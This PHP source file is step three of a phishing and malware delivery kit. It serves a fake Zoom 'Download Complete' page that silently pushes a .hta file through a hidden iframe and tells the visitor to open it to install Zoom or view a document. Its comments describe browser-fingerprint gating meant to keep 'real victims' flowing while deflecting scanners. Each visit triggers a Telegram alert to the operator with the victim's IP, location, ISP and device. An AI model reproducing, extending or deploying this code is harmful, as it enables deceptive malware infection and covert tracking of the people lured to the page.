<?php
require __DIR__ . '/../lib.php';

// Step 3: must arrive from download.php, full Chrome fingerprint.
// The load is scripted (2s spinner setTimeout), so Chrome sends
// Sec-Fetch-User: ?0 even for a human click — requireUser must stay
// false here or every real victim 404s. Pacing is enforced by minAge.
gate_doc(['/download.php'], 4, false);

$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
$tok  = check_token($_GET['tk'] ?? null);
$kind = name_kind($name);

$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);

// Instruction is variant-aware: "to install" for Zoom names,
// "to view your document" for document names. Points at Windows 11
// File Explorer "Recent", where fresh downloads land first.
$instr = ($kind === 'zoom')
    ? 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to install.'
    : 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view your document.';

// ---- one Telegram alert per visit (deduped by token nonce) ----
$key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g   = geo(ip());
    $msg = "\x{1F3AF} New Download Triggered \x{1F3AF}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . "\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Download Complete</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; }
    body { height: 100vh; width: 100vw; background: linear-gradient(160deg, #1b2735 0%, #0f3460 55%, #16213e 100%); }
    .modal-overlay {
      position: fixed; top: 0; left: 0; height: 100vh; width: 100vw;
      background-color: rgba(0,0,0,0.45);
      display: flex; justify-content: center; align-items: center; z-index: 1000;
      padding: 16px;
    }
    .modal-content {
      background-color: white; padding: 34px 30px; border-radius: 10px;
      width: 90%; max-width: 500px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: modalFadeIn 0.3s ease-out; text-align: center;
    }
    @keyframes modalFadeIn { from { opacity:0; transform:translateY(-20px);} to { opacity:1; transform:translateY(0);} }
    .modal-header img { width: 92px; margin-bottom: 16px; }
    .modal-header h2 { font-size: 20px; color: #1a1a1a; font-weight: 600; margin-bottom: 10px; }
    .modal-text { color: #555; font-size: 14px; line-height: 1.5; margin-top: 0; }
    .modal-subtext { color: #777; font-size: 12.5px; line-height: 1.55; margin: 0; padding-top: 12px; }
    a { color: #0B5CFF; text-decoration: none; font-weight: 600; }
    a:hover { text-decoration: underline; }
    .info-text { color: #999; font-size: 12px; margin-top: 14px; }
  </style>
</head>
<body>
  <div id="confirmationModal" class="modal-overlay">
    <div class="modal-content">
      <div class="modal-header">
        <img src="assets/zoomicon.png" alt="Zoom">
        <h2>Download Complete</h2>
      </div>
      <p class="modal-text"><?php echo $kind === 'zoom' ? 'Your download is ready.' : "You've received a secured file."; ?></p>
      <p class="modal-subtext">
        <?php echo $instr; ?>
      </p>
      <p class="modal-subtext">
        If your download did not start automatically, you can <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">download it manually</a>.
      </p>
      <p class="info-text">After installation, return to this page to join your meeting.</p>
    </div>
  </div>

  <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
       Sec-Fetch-Dest: iframe, no Sec-Fetch-User — exactly what gate_dl() expects. -->
  <iframe src="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>" style="display:none;" onload="this.remove();"></iframe>
</body>
</html>
